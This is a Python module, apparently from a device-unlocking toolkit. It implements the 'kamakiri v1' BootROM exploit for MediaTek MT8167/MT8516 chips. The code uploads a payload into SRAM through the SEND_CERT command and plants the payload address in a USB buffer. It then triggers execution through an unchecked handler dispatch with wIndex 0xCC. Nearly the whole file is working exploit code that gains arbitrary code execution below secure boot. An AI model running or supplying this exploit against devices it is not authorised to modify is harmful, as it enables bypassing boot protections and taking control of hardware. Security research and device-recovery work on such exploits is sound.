"""Kamakiri v1 loader for the MT8167/MT8516 BROM (hwcode 0x8167).

Two BROM exploit families exist in the wild:

* The linecode/ptr_da family (bypass_utility ``ptr_usbdl`` path, mtkclient
  ``kamakiri2``): overflows SET_LINE_CODING to rewrite BROM USB buffer
  pointers, then abuses the 0xDA register-access command.  On this 8167 BROM
  that path deterministically returns status 0x1A1D (KAMAKIRI2_CACHE_ISSUE) —
  confirmed on hardware with both known parameter variants.
* The kamakiri v1 family: uploads the payload with the SEND_CERT command
  (0xE0) into SRAM at ``brom_payload_addr`` (0x100A00), then triggers
  execution through the unchecked ``if_info[wIndex]`` handler dispatch with
  ``wIndex = 0xCC``.  This is the flow proven on this exact BROM build
  (hw_sub 0x8a00, hw_ver 0xcb00, sw 0x1) in April 2021.

This module implements the v1 flow.
"""

from common import from_bytes, to_bytes
from logger import log

import usb.core

PAYLOAD_ADDRESS = 0x100A00
WATCHDOG = 0x10007000
TRIGGER_INDEX = 0xCC


def _p32(value: int) -> bytes:
    return value.to_bytes(4, "big")


def kamakiri_v1(device, payload: bytes) -> None:
    """Upload ``payload`` via SEND_CERT and trigger it with wIndex 0xCC."""

    log("Using kamakiri v1 (SEND_CERT upload, wIndex 0xCC trigger)")

    # Spray the payload address into usbacm_tx_buf via read32 echo:
    # each command echoes its raw argument bytes through the TX buffer, and
    # the trigger reads if_info[0xCC] as a LITTLE-ENDIAN pointer.  write32()
    # puts its word on the wire big-endian, so pre-byteswap the value here
    # (same double-swap as bypass_utility) to plant the little-endian bytes
    # of PAYLOAD_ADDRESS (00 0a 10 00) at the if_info[0xCC] slot.
    addr = WATCHDOG + 0x50
    device.write32(addr, from_bytes(to_bytes(PAYLOAD_ADDRESS, 4), 4, "<"))
    cnt = 15
    for i in range(cnt):
        device.read32(addr - (cnt - i) * 4, cnt - i + 1)

    # SEND_CERT (0xE0): BROM reads len bytes into 0x100A00.
    device.echo(0xE0)

    device.echo(len(payload), 4)

    status = device.read(2)
    if from_bytes(status, 2) != 0:
        raise RuntimeError("status is {}".format(status.hex()))

    device.write(payload)

    # clear 4 bytes
    device.read(4)

    udev = device.udev
    try:
        # noinspection PyProtectedMember
        udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
    except AttributeError as error:
        raise RuntimeError(
            "libusb is not installed for port {}".format(device.dev.port)
        ) from error

    # Trigger: unchecked if_info[wIndex] handler dispatch jumps to the
    # payload address planted in the TX buffer.  The BROM never ACKs this
    # control request when the payload takes over (that is the exploit
    # working), so treat every USBError here as "trigger sent" and let the
    # stage-1 sync read below decide the outcome — same as bypass_utility.
    try:
        udev.ctrl_transfer(0xA1, 0, 0, TRIGGER_INDEX, 0)
    except usb.core.USBError as error:
        log("Trigger transfer: {}".format(error))
